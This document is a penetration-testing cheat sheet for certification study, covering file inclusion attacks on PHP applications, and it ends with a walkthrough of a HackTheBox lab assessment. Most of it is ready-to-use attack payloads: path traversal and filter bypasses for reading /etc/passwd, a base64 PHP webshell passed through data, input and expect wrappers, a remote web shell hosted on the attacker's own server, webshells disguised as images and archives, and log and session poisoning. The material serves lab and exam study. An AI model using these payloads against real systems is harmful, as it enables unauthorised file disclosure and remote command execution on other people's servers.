# File Inclusions  

>My BSCP study notes on [File Path Traversal aka File Inclusions](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study#file-path-traversal)  


## Local File Inclusion

| **Command** | **Description** |
| --------------|-------------------|
| **Basic LFI** |
| `/index.php?language=/etc/passwd` | [Basic LFI](https://academy.hackthebox.com/module/23/section/250) |
| `/index.php?language=../../../../etc/passwd` | LFI with path traversal - This is method to identify valid users on target server. |
| `/index.php?language=/../../../etc/passwd` | LFI with name prefix. |
| `GET /index.php?language=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd` | [Using the file inclusion find the name of a user on the system](https://academy.hackthebox.com/module/23/section/251) |
| `/index.php?language=./languages/../../../../etc/passwd` | LFI with approved path |
| `GET /index.php?language=languages/....//....//....//....//...//flag.txt` | LFI with approved path of `languages/` in front and escaping filter. |
| **LFI Bypasses** |
| `/index.php?language=....//....//....//....//....//etc/passwd` | Bypass basic path [traversal filter](https://academy.hackthebox.com/module/23/section/1491) |
| `/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64` | Bypass filters with URL encoding - [Online URL Decode Encoder](https://www.urldecoder.org/) |
| `/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]` | Bypass appended extension with path truncation (obsolete) [Appended Extension - Path Truncation](https://academy.hackthebox.com/module/23/section/1491) |
| `echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done` | This bash script will produce the required 2048 times string traversal path to filter and truncate the php extension. |
| `/index.php?language=../../../../etc/passwd%00` | Bypass appended extension with `null byte` (obsolete) |
| `/index.php?language=php://filter/read=convert.base64-encode/resource=config` | Read source code for the PHP page with base64 filter - [Source Code Disclosure using PHP Filters](https://academy.hackthebox.com/module/23/section/1492) |


## Remote Code Execution  

>The expect wrapper, which allows us to directly run commands through URL streams. Expect works very similarly to the web shells.
>The data wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the `allow_url_include` setting is enabled in the PHP configurations.  
  
## PHP Wrappers  
  
| **Command** | **Description** |
| -------------- | -------------- |
| `/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id` | RCE [Remote Command Execution with data wrapper](https://academy.hackthebox.com/module/23/section/253) |
| `echo '<?php system($_GET["cmd"]); ?>' \| base64` | Produce the above used base64 string as a webshell that can be passed in to the data wrapper to get command execution |
| `curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"` | Checking PHP Configurations, Once we have the base64 encoded string, we can decode it and grep for allow_url_include to see its value |
| `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"` | RCE with input wrapper |
| `curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"` | RCE with expect wrapper |

## RFI Remote File Inclusion  

| **Command** | **Description** |
| --------------|-------------------|
| `echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <LISTENING_PORT>` | Host web shell |
| `/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id` | Include remote PHP web shell |


## LFI + Upload  

| **Command** | **Description** |
| --------------|-------------------|
| `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif` | Create malicious image by Crafting Malicious GIF webshell |
| `/index.php?language=./profile_images/shell.gif&cmd=id` | RCE with malicious uploaded image |
| `echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php` | Create malicious [zip archive](https://academy.hackthebox.com/module/23/section/1493) as `shell.jpg` |
| `/index.php?language=zip://shell.zip%23shell.php&cmd=id` | RCE with malicious uploaded zip |
| `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg` | Create malicious phar 'as jpg', compile it into a phar file and rename it to `shell.jpg` |
| `/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id` | RCE with malicious uploaded phar |

## Log Session Poisoning  

| **Command** | **Description** |
| --------------|-------------------|
| `PHPSESSID=nguh23jsnmkjuvesphkhoo2ptt` | Example of session cookie indicate the log path as `/var/lib/php/sessions/sess_nguh23jsnmkjuvesphkhoo2ptt` |
| `/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` | Read PHP session parameters |
| `<?php system($_GET["cmd"]);?>` | This webshell url encode to the following payload used for poisoning, `%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E` |
| `/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E` | Poison PHP session with web shell in [web server log with poison attack](https://academy.hackthebox.com/module/23/section/252) |
| `/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id` | RCE through poisoned PHP session |
| `curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'` | Poison server log |
| `/index.php?language=/var/log/apache2/access.log&cmd=id` | RCE through poisoned PHP session |


## FUZZING LFI Parameters + Files  

| **Command** | **Description** |
| --------------|-------------------|
| `sudo python -m pyftpdlib -p 21` | start a basic FTP server with Python's pyftpdlib |
| `impacket-smbserver -smb2support share $(pwd)` | SMB file share hosting |
| `sudo python3 -m http.server <LISTENING_PORT>` | To host our shell.php |
| `ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php` | Fuzzing for PHP Files |
| `ffuf -c -ic -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value'` | Fuzz page for undocumented web parameters using [FFUF Automated Scanning](https://academy.hackthebox.com/module/23/section/1494) |
| `ffuf -w /usr/share/seclists/Fuzzing/XSS/XSS-With-Context-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ'` | Fuzz LFI payloads with [LFI wordlists](https://academy.hackthebox.com/module/23/section/1494) |
| `ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287` | Fuzz webroot path |
| `ffuf -c -ic -w drtychai-lfi-wordlist.txt:FUZZ -u 'http://94.237.49.11:53690/ilf_admin/index.php?log=../../../../../../../..FUZZ' -fs 2046 -replay-proxy http://127.0.0.1:8080` | FFUF via proxy an identified LFI injection web paramenter with the wordlist drtychai lfi. |
| `ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287` | Fuzz server configurations |
| [LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) | SecLists Fuzzing LFI |
| [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) |
| [Webroot path wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)
| [Webroot path wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt) |
| [Server configurations wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)
| [Server configurations wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows) |

>Example:
>After Discovering the web parameter `view`, Burp Suite discovered this LFI
  
```
GET /index.php?view=../../../../../../../../..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
```


## File Inclusion Functions

| **Function** | **Read Content** | **Execute** | **Remote URL** |
| ----- | :-----: | :-----: | :-----: |
| **PHP** |
| `include()`/`include_once()` | ✅ | ✅ | ✅ |
| `require()`/`require_once()` | ✅ | ✅ | ❌ |
| `file_get_contents()` | ✅ | ❌ | ✅ |
| `fopen()`/`file()` | ✅ | ❌ | ❌ |
| **NodeJS** |
| `fs.readFile()` | ✅ | ❌ | ❌ |
| `fs.sendFile()` | ✅ | ❌ | ❌ |
| `res.render()` | ✅ | ✅ | ❌ |
| **Java** |
| `include` | ✅ | ❌ | ❌ |
| `import` | ✅ | ✅ | ✅ |
| **.NET** | |
| `@Html.Partial()` | ✅ | ❌ | ❌ |
| `@Html.RemotePartial()` | ✅ | ❌ | ✅ |
| `Response.WriteFile()` | ✅ | ❌ | ❌ |
| `include` | ✅ | ✅ | ✅ |


# Skills Assessment - File Inclusion  

>[LFI Skill Scenario](https://academy.hackthebox.com/module/23/section/513)  
>The company INLANEFREIGHT has contracted you to perform a web application assessment against one of their public-facing websites. 
>They have been through many assessments in the past but have added some new functionality in a hurry and are particularly concerned about file inclusion/path traversal vulnerabilities.

>They provided a target IP address and no further information [83.136.252.24:46462](83.136.252.24:46462)  

## Enumeration  

>Identify LFI or file inclusion injection point.  

```
ffuf -c -ic -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://83.136.252.24:46462/FUZZ.php
```  

![LFI-skills-assess-ffuf](/images/LFI-skills-assess-ffuf-1.png)  

>From the Identified pages on root of web app , searching for parameters on each page:  

```
ffuf -c -ic -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://83.136.252.24:46462/about.php?FUZZ=value'
```  

Identified parameter: `http://83.136.252.24:46462/index.php?page=value`  

### PHP Filter Read  

>Get the source code of the `index.php` page, but do not include `php` extension as the web application append it automatically.  

```
GET /index.php?page=php://filter/read=convert.base64-encode/resource=index 
```  

>Convert response base64 string to php code:  

```
echo 'PCFET0NUWVBFIGh0hjyrujwergwrtbWw <snip> teyrjetyjtryjrytjCg== | base64 -d > index.php
cat index.php | grep -ie 'Admin'
```  

![LFI-skills-assess-php-filter-source-code](/images/LFI-skills-assess-php-filter-source-code.png)  

>Extract with same method `error.php` and `main.php` source code.  

>Discover this php comment in the source code:  

```
// echo '<li><a href="ilf_admin/index.php">Admin</a></li>';
```

![LFI-skills-assess-identified](/images/LFI-skills-assess-identified.png)  

>By Assessing the admin page discovered in the PHP source code comment, and using the `log` parameter to read files. 
>Log Poisoning technique to gain remote code execution and find a flag in the / root directory of the file system.  

### Log Poison  

>The FFUF command identified the `nginx.conf` file that indicate the path to the access logs as `/var/log/nginx/access.log`.  

```
ffuf -c -ic -w /usr/share/seclists/Fuzzing/XSS/XSS-With-Context-Jhaddix.txt:FUZZ -u 'http://94.237.49.11:53690/ilf_admin/index.php?log=../../../../../../../..FUZZ' -replay-proxy http://127.0.0.1:8080 -fs 2046
``` 

![LFI-skills-assess-log-path](/images/LFI-skills-assess-log-path.png)  

>In the log we notice the `user-agent` is reflected and stored.
>PHP webshell code inserted as the value of `User-Agent`:  

```
<?php system($_GET['cmd']); ?>
```  

![LFI-skills-assess-log-poison](/images/LFI-skills-assess-log-poison.png)  

